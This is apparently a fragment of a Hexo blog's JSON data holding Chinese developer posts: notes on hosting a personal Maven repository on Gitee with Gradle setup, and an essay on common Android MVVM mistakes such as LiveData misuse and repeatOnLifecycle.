punctuation\">\"</span>http://maven.apache.org/SETTINGS/1.2.0 https://maven.apache.org/xsd/settings-1.2.0.xsd<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n  <span class=\"token comment\">&lt;!-- localRepository\n   | The path to the local repository maven will use to store artifacts.\n   |\n   | Default: ${user.home}/.m2/repository\n  &lt;localRepository&gt;/path/to/local/repo&lt;/localRepository&gt;\n\t下面是要添加的内容\n  --&gt;</span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>localRepository</span><span class=\"token punctuation\">&gt;</span></span>E:\\ColdRain_Moro\\项目\\maven\\repo<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>localRepository</span><span class=\"token punctuation\">&gt;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"如何使用\"><a href=\"#如何使用\" class=\"headerlink\" title=\"如何使用\"></a>如何使用</h3><p>我一般只用gradle，所以这里只标记gradle的使用方式</p>\n<p><em><strong>gradle yyds</strong></em></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">repositories {\n    mavenCentral()\n    // 添加我的仓库\n    maven { url = uri(\"https://gitee.com/coldrain-moro/maven/raw/master/repo\") }\n}\n\ndependencies {\n\t// 导入仓库里的依赖tiphareth\n    compileOnly(\"ink.ptms.tiphareth:tiphareth:1.4.0\")\n    compileOnly(\"public:PlaceholderAPI:2.10.9@jar\")\n    compileOnly(\"ink.ptms.core:v11605:11605\")\n    compileOnly(kotlin(\"stdlib\"))\n    compileOnly(fileTree(\"libs\"))\n}<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":"前去拜访"},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go💕","url":"https://blog.stellaris.wang/","title":"前去拜访"}]}},"excerpt":"","more":"<p>鼓捣了一晚上终于弄出来了……</p>\n<p><a href=\"https://gitee.com/coldrain-moro/maven\">maven: 寒雨的maven仓库 (gitee.com)</a></p>\n<p>也算是给自己当初偷懒没去多多了解maven补上了一课，出来混，迟早要还的</p>\n<p>之所以选择gitee而没有选择github当然是因为速度快</p>\n<h2 id=\"Note\"><a href=\"#Note\" class=\"headerlink\" title=\"Note\"></a>Note</h2><h3 id=\"上传jar到仓库的命令\"><a href=\"#上传jar到仓库的命令\" class=\"headerlink\" title=\"上传jar到仓库的命令\"></a>上传jar到仓库的命令</h3><p>像这样写上传了Tiphareth到本地maven仓库里</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">mvn install:install-file -Dfile&#x3D;E:\\ColdRain_Moro\\项目\\Tiphareth\\build\\libs\\Tiphareth-1.4.0.jar -DgroupId&#x3D;ink.ptms.tiphareth -DartifactId&#x3D;tiphareth -Dversion&#x3D;1.4.0 -Dpackaging&#x3D;Jar<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"改变默认maven仓库路径\"><a href=\"#改变默认maven仓库路径\" class=\"headerlink\" title=\"改变默认maven仓库路径\"></a>改变默认maven仓库路径</h3><p>在 settings.xml 中下文标记位置添加如下内容</p>\n<pre class=\"line-numbers language-markup\" data-language=\"markup\"><code class=\"language-markup\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>settings</span> <span class=\"token attr-name\">xmlns</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>http://maven.apache.org/SETTINGS/1.2.0<span class=\"token punctuation\">\"</span></span>\n          <span class=\"token attr-name\"><span class=\"token namespace\">xmlns:</span>xsi</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>http://www.w3.org/2001/XMLSchema-instance<span class=\"token punctuation\">\"</span></span>\n          <span class=\"token attr-name\"><span class=\"token namespace\">xsi:</span>schemaLocation</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>http://maven.apache.org/SETTINGS/1.2.0 https://maven.apache.org/xsd/settings-1.2.0.xsd<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n  <span class=\"token comment\">&lt;!-- localRepository\n   | The path to the local repository maven will use to store artifacts.\n   |\n   | Default: $&#123;user.home&#125;/.m2/repository\n  &lt;localRepository>/path/to/local/repo&lt;/localRepository>\n\t下面是要添加的内容\n  --></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>localRepository</span><span class=\"token punctuation\">></span></span>E:\\ColdRain_Moro\\项目\\maven\\repo<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>localRepository</span><span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"如何使用\"><a href=\"#如何使用\" class=\"headerlink\" title=\"如何使用\"></a>如何使用</h3><p>我一般只用gradle，所以这里只标记gradle的使用方式</p>\n<p><em><strong>gradle yyds</strong></em></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">repositories &#123;\n    mavenCentral()\n    &#x2F;&#x2F; 添加我的仓库\n    maven &#123; url &#x3D; uri(&quot;https:&#x2F;&#x2F;gitee.com&#x2F;coldrain-moro&#x2F;maven&#x2F;raw&#x2F;master&#x2F;repo&quot;) &#125;\n&#125;\n\ndependencies &#123;\n\t&#x2F;&#x2F; 导入仓库里的依赖tiphareth\n    compileOnly(&quot;ink.ptms.tiphareth:tiphareth:1.4.0&quot;)\n    compileOnly(&quot;public:PlaceholderAPI:2.10.9@jar&quot;)\n    compileOnly(&quot;ink.ptms.core:v11605:11605&quot;)\n    compileOnly(kotlin(&quot;stdlib&quot;))\n    compileOnly(fileTree(&quot;libs&quot;))\n&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n"},{"title":"MMVM七宗罪","date":"2022-07-30T16:00:00.000Z","author":"寒雨","hide":false,"summary":"对掘金上关于MMVM常见错误用法的总结","_content":"\n# MVVM七宗罪\n\n## 其一 拿Fragment当LifecycleOwner\n\nLivedata之所以可以防止泄露，是因为它所持有的lifecycleowner走到`DESTORYED`时就会自动取消所有订阅。\n\n然而Fragment在某些情况下并不会销毁，由于创建一个Fragment代价高昂，在Fragment的跳转过程中，如果使用返回栈，在返回这个fragment时并不会创建一个新的fragment，而是会复用老的Fragment，也就是Fragment的生命周期此时还未结束，但在之前离开这个fragment时，这个fragment中的view确实已经摧毁了。一般我们比较通常的写法是在`onViewCreated`中进行观察，而不是在`onCreate`,也就是说，我们在fragment中的view的生命周期开始时我们订阅了一个可订阅的东西，但却在fragment的生命周期结束时才取消订阅，这就导致了一个问题，我们退出界面时，fragment的view确实已经销毁了，但fragment没有销毁，于是再次进入fragment又会调用一次`onViewCreated`，就会导致我们重复订阅了两次。\n\n解决方式就是使用`viewLifecycleOwner`，这样在view被销毁时就能取消订阅。\n\n## 其二 在launchWhenX中启用协程\n\n### Flow vs. LiveData\n\nFlow总体上看确实功能比LiveData要更加强大，但由于LiveData是android jetpack的一部分，是专为android设计的，所以它在安卓应用场景下至少带来了两个好处\n\n- 生命周期管理 - lifecycleOwner进入destory阶段时，会自动取消订阅，防止内存泄漏\n- 节省资源 - lifecycleOwner在进入STARTED时才会接收数据，避免在后台的无效计算\n\n如果想使用Flow来替代LiveData，那么至少需要做到这两点才行\n\n第一点其实比较好实现，我们很多时候观察的Flow都是一个冷流，冷流的生命周期由订阅它的CoroutineScope决定。而官方的`lifecycle-runtime-ktx`已经为我们的所有lifecycleOwner添加了一个`lifecycleScope`，只要在lifecycleScope启动的协程中订阅就能保证第一点，而即使是热流也会自动取消订阅。我认为在这方面Flow取代LiveData是基本没有问题的，因为只要是个人就能想到使用lifecycleScope启动协程进行流的收集。\n\n那么第二点要如何保证呢？\n\n很多人就会想到所谓的`launchWhenX`，它能让开启的协程在`PAUSED`时挂起，在`STARTED`,`RESUMED`时恢复，似乎看起来很完美，对吗？\n\n可惜的是，这样做只挂起了下游我们收集这个flow的协程，而上游的数据还在持续发送，如果这样做的话，第二点解决的其实很不彻底。\n\n那么，解决方法是什么呢\n\n### repeatOnLifecycle\n\n> lifecycle-runtime-ktx 自 `2.4.0-alpha01` 起，提供了一个新的协程构造器 `lifecyle.repeatOnLifecycle`， 它在离开 X 状态时销毁协程，再进入 X 状态时再启动协程。从其命名上也可以直观地认识这一点，即**围绕某生命周期的进出反复启动新协程**。\n\n是的，不再是挂起，而是直接销毁。这样做的话collect就不是被挂起，而是直接被取消订阅，如果我们这里订阅的是一个冷流，那么上游就会跟着被取消。这是不是就完美的解决了第二点？\n\n同时一旦使用这个方法启动的协程来订阅Flow，这个Flow就也会具有LiveData的重要特性之一: 数据倒灌。这样看来，是不是只要用好这个方法，Flow就完全可以替代LiveData，对吧。\n\n但其实LiveData和Flow还有一些不同之处，我们也不能完全抛弃LiveData，而是要因地制宜。\n\n当然，使用它来收集flow还有一个快捷的写法`flowWithLifecycle(LifecycleOwner)`\n\n## 其三 在onViewCreated中请求数据\n\n在 MVVM 中, ViewModel 的重要职责是解耦 View 与 Model。\n\n- View 向 ViewModel 发出指令，请求数据\n- View 通过 DataBinding 或 LiveData 等订阅 ViewModel 的数据变化\n\n关于订阅 ViewModel 的时机，大家一般放在 `onViewCreated` ，这是没有问题的。但是一个常犯的错误是将 ViewModel 中首次的数据加载也放到 `onViewCreated` 中进行。如果 ViewModel 在 `onViewCreated` 中请求数据，当 View 因为横竖屏等原因重建时会再次请求，而我们知道 ViewModel 的生命周期长于 View，数据可以跨越 View 的生命周期存在，所以没有必要随着 View 的重建反复请求。\n\n> ViewModel 的初次数据加载推荐放到 `init{}` 中进行，这样可以保证 `ViewModelScope` 中只加载一次\n\n## 其四 使用LiveData & StateFlow发送Events\n\nLiveData和StateFlow被设计来保存一个状态，单从这个角度来说，它们设计得非常到位，完美的符合我们的需求。但如果我们的需求不是保存一个状态，而只是希望它在收到一个值时能够通知观察者，也许它们就不太适合了。\n\nLiveData在设计时被赋予了数据倒灌的特性，回到界面时会再次通知一次观察者，事件应该是具有时效性的，这样与我们的需求不符。\n\nLiveData和StateFlow都会产生丢值的问题，因为LiveData和StateFlow设计的时候都只考虑了保留一个值的情况，所以对他们而言，最新的值才是最重要的，已经过期的值就没有必要通知，减少下游的处理逻辑，节省性能，所以这并不是bug，而是一种特性。StateFlow还会忽略重复发送的相同的值，这个特性被称为**防抖**。\n\n## 其五 在Repository层中使用LiveData\n\n我们应该经常在仓库层使用RxJava或者Flow，但其实很少见到说在仓库层使用LiveData，在我印象中这三者应该至少是比较类似的东西，那么为什么LiveData不行呢？有两点点原因:\n\n- 重度依赖lifecycle，仓库层获取不到lifecycleOwner，只能使用observeForever这种可能造成内存泄漏的方法来进行\n- 不支持线程切换 故所有操作符实际上默认都是在主线程上运行\n\n## 其六 ViewModel接口暴露不合理\n\n- 暴露Mutable状态\n- 暴露suspend方法\n","source":"_posts/guilty-of-mvvm.md","raw":"---\ntitle: MMVM七宗罪\ndate: 2022-07-31\nauthor: 寒雨\nhide: false\nsummary: 对掘金上关于MMVM常见错误用法的总结\ncategories: 笔记\ntags:\n  - Android\n  - MVVM\n---\n\n# MVVM七宗罪\n\n## 其一 拿Fragment当LifecycleOwner\n\nLivedata之所以可以防止泄露，是因为它所持有的lifecycleowner走到`DESTORYED`时就会自动取消所有订阅。\n\n然而Fragment在某些情况下并不会销毁，由于创建一个Fragment代价高昂，在Fragment的跳转过程中，如果使用返回栈，在返回这个fragment时并不会创建一个新的fragment，而是会复用老的Fragment，也就是Fragment的生命周期此时还未结束，但在之前离开这个fragment时，这个fragment中的view确实已经摧毁了。一般我们比较通常的写法是在`onViewCreated`中进行观察，而不是在`onCreate`,也就是说，我们在fragment中的view的生命周期开始时我们订阅了一个可订阅的东西，但却在fragment的生命周期结束时才取消订阅，这就导致了一个问题，我们退出界面时，fragment的view确实已经销毁了，但fragment没有销毁，于是再次进入fragment又会调用一次`onViewCreated`，就会导致我们重复订阅了两次。\n\n解决方式就是使用`viewLifecycleOwner`，这样在view被销毁时就能取消订阅。\n\n## 其二 在launchWhenX中启用协程\n\n### Flow vs. LiveData\n\nFlow总体上看确实功能比LiveData要更加强大，但由于LiveData是android jetpack的一部分，是专为android设计的，所以它在安卓应用场景下至少带来了两个好处\n\n- 生命周期管理 - lifecycleOwner进入destory阶段时，会自动取消订阅，防止内存泄漏\n- 节省资源 - lifecycleOwner在进入STARTED时才会接收数据，避免在后台的无效计算\n\n如果想使用Flow来替代LiveData，那么至少需要做到这两点才行\n\n第一点其实比较好实现，我们很多时候观察的Flow都是一个冷流，冷流的生命周期由订阅它的CoroutineScope决定。而官方的`lifecycle-runtime-ktx`已经为我们的所有lifecycleOwner添加了一个`lifecycleScope`，只要在lifecycleScope启动的协程中订阅就能保证第一点，而即使是热流也会自动取消订阅。我认为在这方面Flow取代LiveData是基本没有问题的，因为只要是个人就能想到使用lifecycleScope启动协程进行流的收集。\n\n那么第二点要如何保证呢？\n\n很多人就会想到所谓的`launchWhenX`，它能让开启的协程在`PAUSED`时挂起，在`STARTED`,`RESUMED`时恢复，似乎看起来很完美，对吗？\n\n可惜的是，这样做只挂起了下游我们收集这个flow的协程，而上游的数据还在持续发送，如果这样做的话，第二点解决的其实很不彻底。\n\n那么，解决方法是什么呢\n\n### repeatOnLifecycle\n\n> lifecycle-runtime-ktx 自 `2.4.0-alpha01` 起，提供了一个新的协程构造器 `lifecyle.repeatOnLifecycle`， 它在离开 X 状态时销毁协程，再进入 X 状态时再启动协程。从其命名上也可以直观地认识这一点，即**围绕某生命周期的进出反复启动新协程**。\n\n是的，不再是挂起，而是直接销毁。这样做的话collect就不是被挂起，而是直接被取消订阅，如果我们这里订阅的是一个冷流，那么上游就会跟着被取消。这是不是就完美的解决了第二点？\n\n同时一旦使用这个方法启动的协程来订阅Flow，这个Flow就也会具有LiveData的重要特性之一: 数据倒灌。这样看来，是不是只要用好这个方法，Flow就完全可以替代LiveData，对吧。\n\n但其实LiveData和Flow还有一些不同之处，我们也不能完全抛弃LiveData，而是要因地制宜。\n\n当然，使用它来收集flow还有一个快捷的写法`flowWithLifecycle(LifecycleOwner)`\n\n## 其三 在onViewCreated中请求数据\n\n在 MVVM 中, ViewModel 的重要职责是解耦 View 与 Model。\n\n- View 向 ViewModel 发出指令，请求数据\n- View 通过 DataBinding 或 LiveData 等订阅 ViewModel 的数据变化\n\n关于订阅 ViewModel 的时机，大家一般放在 `onViewCreated` ，这是没有问题的。但是一个常犯的错误是将 ViewModel 中首次的数据加载也放到 `onViewCreated` 中进行。如果 ViewModel 在 `onViewCreated` 中请求数据，当 View 因为横竖屏等原因重建时会再次请求，而我们知道 ViewModel 的生命周期长于 View，数据可以跨越 View 的生命周期存在，所以没有必要随着 View 的重建反复请求。\n\n> ViewModel 的初次数据加载推荐放到 `init{}` 中进行，这样可以保证 `ViewModelScope` 中只加载一次\n\n## 其四 使用LiveData & StateFlow发送Events\n\nLiveData和StateFlow被设计来保存一个状态，单从这个角度来说，它们设计得非常到位，完美的符合我们的需求。但如果我们的需求不是保存一个状态，而只是希望它在收到一个值时能够通知观察者，也许它们就不太适合了。\n\nLiveData在设计时被赋予了数据倒灌的特性，回到界面时会再次通知一次观察者，事件应该是具有时效性的，这样与我们的需求不符。\n\nLiveData和StateFlow都会产生丢值的问题，因为LiveData和StateFlow设计的时候都只考虑了保留一个值的情况，所以对他们而言，最新的值才是最重要的，已经过期的值就没有必要通知，减少下游的处理逻辑，节省性能，所以这并不是bug，而是一种特性。StateFlow还会忽略重复发送的相同的值，这个特性被称为**防抖**。\n\n## 其五 在Repository层中使用LiveData\n\n我们应该经常在仓库层使用RxJava或者Flow，但其实很少见到说在仓库层使用LiveData，在我印象中这三者应该至少是比较类似的东西，那么为什么LiveData不行呢？有两点点原因:\n\n- 重度依赖lifecycle，仓库层获取不到lifecycleOwner，只能使用observeForever这种可能造成内存泄漏的方法来进行\n- 不支持线程切换 故所有操作符实际上默认都是在主线程上运行\n\n## 其六 ViewModel接口暴露不合理\n\n- 暴露Mutable状态\n- 暴露suspend方法\n","slug":"guilty-of-mvvm","published":1,"updated":"2022-11-24T03:01:42.997Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23jtf0010sfkldviu9u2k","content":"<h1 id=\"MVVM七宗罪\"><a href=\"#MVVM七宗罪\" class=\"headerlink\" title=\"MVVM七宗罪\"></a>MVVM七宗罪</h1><h2 id=\"其一-拿Fragment当LifecycleOwner\"><a href=\"#其一-拿Fragment当LifecycleOwner\" class=\"headerlink\" title=\"其一 拿Fragment当LifecycleOwner\"></a>其一 拿Fragment当LifecycleOwner</h2><p>Livedata之所以可以防止泄露，是因为它所持有的lifecycleowner走到<code>DESTORYED</code>时就会自动取消所有订阅。</p>\n<p>然而Fragment在某些情况下并不会销毁，由于创建一个Fragment代价高昂，在Fragment的跳转过程中，如果使用返回栈，在返回这个fragment时并不会创建一个新的fragment，而是会复用老的Fragment，也就是Fragment的生命周期此时还未结束，但在之前离开这个fragment时，这个fragment中的view确实已经摧毁了。一般我们比较通常的写法是在<code>onViewCreated</code>中进行观察，而不是在<code>onCreate</code>,也就是说，我们在fragment中的view的生命周期开始时我们订阅了一个可订阅的东西，但却在fragment的生命周期结束时才取消订阅，这就导致了一个问题，我们退出界面时，fragment的view确实已经销毁了，但fragment没有销毁，于是再次进入fragment又会调用一次<code>onViewCreated</code>，就会导致我们重复订阅了两次。</p>\n<p>解决方式就是使用<code>viewLifecycleOwner</code>，这样在view被销毁时就能取消订阅。</p>\n<h2 id=\"其二-在launchWhenX中启用协程\"><a href=\"#其二-在launchWhenX中启用协程\" class=\"headerlink\" title=\"其二 在launchWhenX中启用协程\"></a>其二 在launchWhenX中启用协程</h2><h3 id=\"Flow-vs-LiveData\"><a href=\"#Flow-vs-LiveData\" class=\"headerlink\" title=\"Flow vs. LiveData\"></a>Flow vs. LiveData</h3><p>Flow总体上看确实功能比LiveData要更加强大，但由于LiveData是android jetpack的一部分，是专为android设计的，所以它在安卓应用场景下至少带来了两个好处</p>\n<ul>\n<li>生命周期管理 - lifecycleOwner进入destory阶段时，会自动取消订阅，防止内存泄漏</li>\n<li>节省资源 - lifecycleOwner在进入STARTED时才会接收数据，避免在后台的无效计算</li>\n</ul>\n<p>如果想使用Flow来替代LiveData，那么至少需要做到这两点才行</p>\n<p>第一点其实比较好实现，我们很多时候观察的Flow都是一个冷流，冷流的生命周期由订阅它的CoroutineScope决定。而官方的<code>lifecycle-runtime-ktx</code>已经为我们的所有lifecycleOwner添加了一个<code>lifecycleScope</code>，只要在lifecycleScope启动的协程中订阅就能保证第一点，而即使是热流也会自动取消订阅。我认为在这方面Flow取代LiveData是基本没有问题的，因为只要是个人就能想到使用lifecycleScope启动协程进行流的收集。</p>\n<p>那么第二点要如何保证呢？</p>\n<p>很多人就会想到所谓的<code>launchWhenX</code>，它能让开启的协程在<code>PAUSED</code>时挂起，在<code>STARTED</code>,<code>RESUMED</code>时恢复，似乎看起来很完美，对吗？</p>\n<p>可惜的是，这样做只挂起了下游我们收集这个flow的协程，而上游的数据还在持续发送，如果这样做的话，第二点解决的其实很不彻底。</p>\n<p>那么，解决方法是什么呢</p>\n<h3 id=\"repeatOnLifecycle\"><a href=\"#repeatOnLifecycle\" class=\"headerlink\" title=\"repeatOnLifecycle\"></a>repeatOnLifecycle</h3><blockquote>\n<p>lifecycle-runtime-ktx 自 <code>2.4.0-alpha01</code> 起，提供了一个新的协程构造器 <code>lifecyle.repeatOnLifecycle</code>， 它在离开 X 状态时销毁协程，再进入 X 状态时再启动协程。从其命名上也可以直观地认识这一点，即<strong>围绕某生命周期的进出反复启动新协程</strong>。</p>\n</blockquote>\n<p>是的，不再是挂起，而是直接销毁。这样做的话collect就不是被挂起，而是直接被取消订阅，如果我们这里订阅的是一个冷流，那么上游就会跟着被取消。这是不是就完美的解决了第二点？</p>\n<p>同时一旦使用这个方法启动的协程来订阅Flow，这个Flow就也会具有LiveData的重要特性之一: 数据倒灌。这样看来，是不是只要用好这个方法，Flow就完全可以替代LiveData，对吧。</p>\n<p>但其实LiveData和Flow还有一些不同之处，我们也不能完全抛弃LiveData，而是要因地制宜。</p>\n<p>当然，使用它来收集flow还有一个快捷的写法<code>flowWithLifecycle(LifecycleOwner)</code></p>\n<h2 id=\"其三-在onViewCreated中请求数据\"><a href=\"#其三-在onViewCreated中请求数据\" class=\"headerlink\" title=\"其三 在onViewCreated中请求数据\"></a>其三 在onViewCreated中请求数据</h2><p>在 MVVM 中, ViewModel 的重要职责是解耦 View 与 Model。</p>\n<ul>\n<li>View 向 ViewModel 发出指令，请求数据</li>\n<li>View 通过 DataBinding 或 LiveData 等订阅 ViewModel 的数据变化</li>\n</ul>\n<p>关于订阅 ViewModel 的时机，大家一般放在 <code>onViewCreated</code> ，这是没有问题的。但是一个常犯的错误是将 ViewModel 中首次的数据加载也放到 <code>onViewCreated</code> 中进行。如果 ViewModel 在 <code>onViewCreated</code> 中请求数据，当 View 因为横竖屏等原因重建时会再次请求，而我们知道 ViewModel 的生命周期长于 View，数据可以跨越 View 的生命周期存在，所以没有必要随着 View 的重建反复请求。</p>\n<blockquote>\n<p>ViewModel 的初次数据加载推荐放到 <code>init{}</code> 中进行，这样可以保证 <code>ViewModelScope</code> 中只加载一次</p>\n</blockquote>\n<h2 id=\"其四-使用LiveData-amp-StateFlow发送Events\"><a href=\"#其四-使用LiveData-amp-StateFlow发送Events\" class=\"headerlink\" title=\"其四 使用LiveData &amp; StateFlow发送Events\"></a>其四 使用LiveData &amp; StateFlow发送Events</h2><p>LiveData和StateFlow被设计来保存一个状态，单从这个角度来说，它们设计得非常到位，完美的符合我们的需求。但如果我们的需求不是保存一个状态，而只是希望它在收到一个值时能够通知观察者，也许它们就不太适合了。</p>\n<p>LiveData在设计时被赋予了数据倒灌的特性，回到界面时会再次通知一次观察者，事件应该是具有时效性的，这样与我们的需求不符。</p>\n<p>LiveData和StateFlow都会产生丢值的问题，因为LiveData和StateFlow设计的时候都只考虑了保留一个值的情况，所以对他们而言，最新的值才是最重要的，已经过期的值就没有必要通知，减少下游的处理逻辑，节省性能，所以这并不是bug，而是一种特性。StateFlow还会忽略重复发送的相同的值，这个特性被称为<strong>防抖</strong>。</p>\n<h2 id=\"其五-在Repository层中使用LiveData\"><a href=\"#其五-在Repository层中使用LiveData\" class=\"headerlink\" title=\"其五 在Repository层中使用LiveData\"></a>其五 在Repository层中使用LiveData</h2><p>我们应该经常在仓库层使用RxJava或者Flow，但其实很少见到说在仓库层使用LiveData，在我印象中这三者应该至少是比较类似的东西，那么为什么LiveData不行呢？有两点点原因:</p>\n<ul>\n<li>重度依赖lifecycle，仓库层获取不到lifecycleOwner，只能使用observeForever这种可能造成内存泄漏的方法来进行</li>\n<li>不支持线程切换 故所有操作符实际上默认都是在主线程上运行</li>\n</ul>\n<h2 id=\"其六-ViewModel接口暴露不合理\"><a href=\"#其六-ViewModel接口暴露不合理\" class=\"headerlink\" title=\"其六 ViewModel接口暴露不合理\"></a>其六 ViewModel接口暴露不合理</h2><ul>\n<li>暴露Mutable状态</li>\n<li>暴露suspend方法</li>\n</ul>\n","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":"前去拜访"},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go💕","url":"https://blog.stellaris.wang/","title":"前去拜访"}]}},"excerpt":"","more":"<h1 id=\"MVVM七宗罪\"><a href=\"#MVVM七宗罪\" class=\"headerlink\" title=\"MVVM七宗罪\"></a>MVVM七宗罪</h1><h2 id=\"其一-拿Fragment当LifecycleOwner\"><a href=\"#其一-拿Fragment当LifecycleOwner\" class=\"headerlink\" title=\"其一 拿Fragment当LifecycleOwner\"></a>其一 拿Fragment当LifecycleOwner</h2><p>Livedata之所以可以防止泄露，是因为它所持有的lifecycleowner走到<code>DESTORYED</code>时就会自动取消所有订阅。</p>\n<p>然而Fragment在某些情况下并不会销毁，由于创建一个Fragment代价高昂，在Fragment的跳转过程中，如果使用返回栈，在返回这个fragment时并不会创建一个新的fragment，而是会复用老的Fragment，也就是Fragment的生命周期此时还未结束，但在之前离开这个fragment时，这个fragment中的view确实已经摧毁了。一般我们比较通常的写法是在<code>onViewCreated</code>中进行观察，而不是在<code>onCreate</code>,也就是说，我们在fragment中的view的生命周期开始时我们订阅了一个可订阅的东西，但却在fragment的生命周期结束时才取消订阅，这就导致了一个问题，我们退出界面时，fragment的view确实已经销毁了，但fragment没有销毁，于是再次进入fragment又会调用一次<code>onViewCreated</code>，就会导致我们重复订阅了两次。</p>\n<p>解决方式就是使用<code>viewLifecycleOwner</code>，这样在view被销毁时就能取消订阅。</p>\n<h2 id=\"其二-在launchWhenX中启用协程\"><a href=\"#其二-在launchWhenX中启用协程\" class=\"headerlink\" title=\"其二 在launchWhenX中启用协程\"></a>其二 在launchWhenX中启用协程</h2><h3 id=\"Flow-vs-LiveData\"><a href=\"#Flow-vs-LiveData\" class=\"headerlink\" title=\"Flow vs. LiveData\"></a>Flow vs. LiveData</h3><p>Flow总体上看确实功能比LiveData要更加强大，但由于LiveData是android jetpack的一部分，是专为android设计的，所以它在安卓应用场景下至少带来了两个好处</p>\n<ul>\n<li>生命周期管理 - lifecycleOwner进入destory阶段时，会自动取消订阅，防止内存泄漏</li>\n<li>节省资源 - lifecycleOwner在进入STARTED时才会接收数据，避免在后台的无效计算</li>\n</ul>\n<p>如果想使用Flow来替代LiveData，那么至少需要做到这两点才行</p>\n<p>第一点其实比较好实现，我们很多时候观察的Flow都是一个冷流，冷流的生命周期由订阅它的CoroutineScope决定。而官方的<code>lifecycle-runtime-ktx</code>已经为我们的所有lifecycleOwner添加了一个<code>lifecycleScope</code>，只要在lifecycleScope启动的协程中订阅就能保证第一点，而即使是热流也会自动取消订阅。我认为在这方面Flow取代LiveData是基本没有问题的，因为只要是个人就能想到使用lifecycleScope启动协程进行流的收集。</p>\n<p>那么第二点要如何保证呢？</p>\n<p>很多人就会想到所谓的<code>launchWhenX</code>，它能让开启的协程在<code>PAUSED</code>时挂起，在<code>STARTED</code>,<code>RESUMED</code>时恢复，似乎看起来很完美，对吗？</p>\n<p>可惜的是，这样做只挂起了下游我们收集这个flow的协程，而上游的数据还在持续发送，如果这样做的话，第二点解决的其实很不彻底。</p>\n<p>那么，解决方法是什么呢</p>\n<h3 id=\"repeatOnLifecycle\"><a href=\"#repeatOnLifecycle\" class=\"headerlink\" title=\"repeatOnLifecycle\"></a>repeatOnLifecycle</h3><blockquote>\n<p>lifecycle-runtime-ktx 自 <code>2.4.0-alpha01</code> 起，提供了一个新的协程构造器 <code>lifecyle.repeatOnLifecycle</code>， 它在离开 X 状态时销毁协程，再进入 X 状态时再启动协程。从其命名上也可以直观地认识这一点，即<strong>围绕某生命周期的进出反复启动新协程</strong>。</p>\n</blockquote>\n<p>是的，不再是挂起，而是直接销毁。这样做的话collect就不是被挂起，而是直接被取消订阅，如果我们这里订阅的是一个冷流，那么上游就会跟着被取消。这是不是就完美的解决了第二点？</p>\n<p>同时一旦使用这个方法启动的协程来订阅Flow，这个Flow就也会具有LiveData的重要特性之一: 数据倒灌。这样看来，是不是只要用好这个方法，Flow就完全可以替代LiveData，对吧。</p>\n<p>但其实LiveData和Flow还有一些不同之处，我们也不能完全抛弃LiveData，而是要因地制宜。</p>\n<p>当然，使用它来收集flow还有一个快捷的写法<code>flowWithLifecycle(LifecycleOwner)</code></p>\n<h2 id=\"其三-在onViewCreated中请求数据\"><a href=\"#其三-在onViewCreated中请求数据\" class=\"headerlink\" title=\"其三 在onViewCreated中请求数据\"></a>其三 在onViewCreated中请求数据</h2><p>在 MVVM 中, ViewModel 的重要职责是解耦 View 与 Model。</p>\n<ul>\n<li>View 向 ViewModel 发出指令，请求数据</li>\n<li>View 通过 DataBinding 或 LiveData 等订阅 ViewModel 的数据变化</li>\n</ul>\n<p>关于订阅 ViewModel 的时机，大家一般放在 <code>onViewCreated</code> ，这是没有问题的。但是一个常犯的错误是将 ViewModel 中首次的数据加载也放到 <code>onViewCreated</code> 中进行。如果 ViewModel 在 <code>onViewCreated</code> 中请求数据，当 View 因为横竖屏等原因重建时会再次请求，而我们知道 ViewModel 的生命周期长于 View，数据可以跨越 View 的生命周期存在，所以没有必要随着 View 的重建反复请求。</p>\n<blockquote>\n<p>ViewModel 的初次数据加载推荐放到 <code>init&#123;&#125;</code> 中进行，这样可以保证 <code>ViewModelScope</code> 中只加载一次</p>\n</blockquote>\n<h2 id=\"其四-使用LiveData-amp-StateFlow发送Events\"><a href=\"#其四-使用LiveData-amp-StateFlow发送Events\" class=\"headerlink\" title=\"其四 使用LiveData &amp; StateFlow发送Events\"></a>其四 使用LiveData &amp; 